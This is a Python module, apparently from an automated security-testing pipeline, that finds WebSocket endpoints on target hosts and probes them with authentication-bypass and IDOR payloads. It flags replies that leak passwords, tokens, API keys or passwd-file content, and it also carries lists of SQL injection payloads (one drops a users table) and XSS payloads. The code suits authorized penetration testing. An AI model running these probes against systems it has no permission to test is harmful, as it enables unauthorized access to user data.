#!/usr/bin/env python3
# engines/websocket_engine.py — V7 WebSocket Security Testing Engine
# Discovers and tests WebSocket endpoints for auth bypass, injection, etc.
# MilkyWay Intelligence | Author: Sharlix

import asyncio
import json
import re
import urllib.parse
from typing import List, Optional

# WS endpoint patterns to discover
WS_DISCOVERY_PATTERNS = [
    r'new WebSocket\s*\(\s*["\']([^"\']+)',
    r'io\s*\(\s*["\']([^"\']+)',
    r'socket\.connect\s*\(\s*["\']([^"\']+)',
    r'ws://[^\s"\'<>]+',
    r'wss://[^\s"\'<>]+',
]

WS_COMMON_PATHS = [
    "/ws", "/websocket", "/socket.io", "/socket",
    "/ws/chat", "/api/ws", "/live", "/realtime",
    "/ws/v1", "/ws/v2", "/notifications",
]

# Test payloads for WebSocket messages
WS_PAYLOADS = {
    "auth_bypass" : [
        '{"type":"auth","token":""}',
        '{"type":"auth","token":"null"}',
        '{"type":"auth","token":"undefined"}',
        '{"type":"auth","user_id":1,"role":"admin"}',
    ],
    "sqli" : [
        '{"query":"test\' OR 1=1--"}',
        '{"search":"test; DROP TABLE users--"}',
        '{"id":"1 UNION SELECT 1,2,3--"}',
    ],
    "xss" : [
        '{"message":"<script>alert(1)</script>"}',
        '{"content":"<svg/onload=alert(1)>"}',
        '{"text":"<img src=x onerror=alert(1)>"}',
    ],
    "idor" : [
        '{"action":"get_user","user_id":1}',
        '{"action":"get_user","user_id":2}',
        '{"room_id":1}',
        '{"room_id":2}',
    ],
}

# Indicators in WS responses
WS_SENSITIVE_PATTERNS = [
    (r'"password"\s*:\s*"[^"]+"',        "password in response",   "critical"),
    (r'"email"\s*:\s*"[^"@]+@[^"]+"',    "email exposed",          "high"),
    (r'"token"\s*:\s*"[A-Za-z0-9_\-.]+"',"token in response",     "critical"),
    (r'"role"\s*:\s*"admin"',             "admin role",             "critical"),
    (r'"api_key"\s*:\s*"[^"]+"',          "API key exposed",        "critical"),
    (r'root:x?:\d+:\d+:',                 "file content",           "critical"),
    (r'"is_admin"\s*:\s*true',            "admin flag",             "critical"),
]


class WebSocketEngine:
    """
    V7 WebSocket Security Testing Engine.

    Tests:
    1. WS endpoint discovery (from JS source + common paths)
    2. Authentication bypass (empty/null token)
    3. Authorization (access other users' rooms/data)
    4. Message injection (SQLi, XSS)
    5. Sensitive data in responses

    Uses: websockets library (async) or raw TCP fallback
    """

    def __init__(self, pipeline):
        self.p   = pipeline
        self.log = pipeline.log
        self._ws_ok = self._check_ws_lib()

    def _check_ws_lib(self) -> bool:
        try:
            import websockets
            return True
        except ImportError:
            return False

    def run(self):
        """Sync entry point."""
        asyncio.run(self._async_run())

    async def _async_run(self):
        out      = f"{self.p.out}/{self.p.prefix}_websocket.txt"
        live     = self.p.files.get("live_hosts","")
        js_file  = self.p.files.get("js_files","")
        found    = 0

        from core.utils import safe_read
        hosts = safe_read(live)[:15]
        if not hosts:
            self.log.warn("WebSocket: no live hosts"); return

        self.log.info(f"WebSocket: discovering endpoints on {len(hosts)} hosts")

        # Step 1: Discover WS endpoints from JS files
        ws_endpoints = []
        js_urls = safe_read(js_file)[:20] if js_file else []
        for js_url in js_urls:
            discovered = await self._extract_ws_from_js(js_url)
            ws_endpoints.extend(discovered)

        # Step 2: Try common WS paths on each host
        for host in hosts:
            base = host.rstrip("/")
            base_ws = base.replace("https://","wss://").replace("http://","ws://")
            for path in WS_COMMON_PATHS:
                ws_endpoints.append(base_ws + path)

        # Deduplicate
        ws_endpoints = list(set(ws_endpoints))
        self.log.info(f"WebSocket: testing {len(ws_endpoints)} endpoints")

        # Step 3: Test each endpoint
        for ws_url in ws_endpoints[:30]:
            result = await self._test_websocket(ws_url)
            if result:
                vuln_type, detail, severity = result
                with open(out,"a") as f:
                    f.write(f"{vuln_type}: {ws_url} | {detail}\n")
                self.p.add_finding(severity, vuln_type, ws_url, detail, "ws-engine")
                found += 1

        self.log.success(f"WebSocket: {found} findings")

    async def _extract_ws_from_js(self, js_url: str) -> List[str]:
        """Extract WebSocket URLs from JavaScript source."""
        from core.http_client import AsyncHTTPClient
        endpoints = []
        try:
            async with AsyncHTTPClient(timeout=10) as client:
                resp = await client.get(js_url)
                if resp and resp.get("body"):
                    body = resp["body"]
                    for pattern in WS_DISCOVERY_PATTERNS:
                        for match in re.findall(pattern, body, re.IGNORECASE):
                            url = match.strip()
                            if "ws://" in url or "wss://" in url:
                                endpoints.append(url)
        except Exception:
            pass
        return endpoints

    async def _test_websocket(self, ws_url: str) -> Optional[tuple]:
        """Test a WebSocket endpoint for vulnerabilities."""
        if not self._ws_ok:
            return None

        try:
            import websockets

            # Test 1: Connect without auth
            async with websockets.connect(
                ws_url, open_timeout=5, close_timeout=3,
                extra_headers={"User-Agent": "Mozilla/5.0"}
            ) as ws:
                # Receive initial message
                try:
                    init_msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    init_data = json.loads(init_msg) if init_msg else {}
                except Exception:
                    init_data = {}

                # Test auth bypass
                for payload in WS_PAYLOADS["auth_bypass"]:
                    try:
                        await ws.send(payload)
                        resp = await asyncio.wait_for(ws.recv(), timeout=3)
                        if resp:
                            result = self._analyze_ws_response(resp, "auth_bypass")
                            if result:
                                return result
                    except Exception:
                        pass

                # Test IDOR (access different user IDs)
                for payload in WS_PAYLOADS["idor"]:
                    try:
                        await ws.send(payload)
                        resp = await asyncio.wait_for(ws.recv(), timeout=3)
                        if resp:
                            result = self._analyze_ws_response(resp, "idor")
                            if result:
                                return result
                    except Exception:
                        pass

        except Exception:
            pass

        return None

    def _analyze_ws_response(self, response: str, test_type: str) -> Optional[tuple]:
        """Check WS response for sensitive data or vulnerability indicators."""
        for pattern, data_type, severity in WS_SENSITIVE_PATTERNS:
            if re.search(pattern, response, re.IGNORECASE):
                detail = f"WebSocket {test_type}: {data_type} in response"
                vuln   = f"WS_{test_type.upper()}"
                return (vuln, detail, severity)
        return None
